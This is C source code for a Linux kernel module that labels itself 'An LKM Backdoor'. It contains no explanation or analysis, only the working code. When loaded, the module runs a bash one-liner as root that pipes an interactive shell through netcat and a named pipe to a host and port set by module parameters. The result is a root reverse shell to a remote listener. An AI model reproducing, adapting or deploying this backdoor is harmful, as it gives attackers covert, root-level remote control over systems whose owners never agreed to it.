#include <linux/kmod.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/stat.h>

#define ML	"GPL"
#define MA	"@Pink_P4nther"
#define MD	"An LKM Backdoor"
#define MV	"1.2"

static char *host = "REV_TCP_LH=127.0.0.1";
module_param(host, charp, 0000);
static char *port = "REV_TCP_LP=1337";
module_param(port, charp, 0000);

static int __init mload(void)
{
	char *envp[] = {
				"HOME=/root",
				"TERM=xterm",
				host,
				port,
				NULL
			};

	char *argv[] = {
				"/bin/bash",
				"-c",
				"/usr/bin/rm /tmp/pinkit;/usr/bin/mkfifo /tmp/pinkit;/usr/bin/cat /tmp/pinkit|/bin/sh -i 2>&1|/usr/bin/nc $REV_TCP_LH $REV_TCP_LP >/tmp/pinkit",
				NULL
			};

	printk(KERN_INFO "[+] Command Execution Begin\n");
	call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);
	printk(KERN_INFO "[+] Command Execution End\n");
	return 0;
}

static void __exit munload(void)
{
	printk(KERN_INFO "[+] Happy Hacking!\n");
}

module_init(mload);
module_exit(munload);

MODULE_LICENSE(ML);
MODULE_AUTHOR(MA);
MODULE_DESCRIPTION(MD);
MODULE_VERSION(MV);
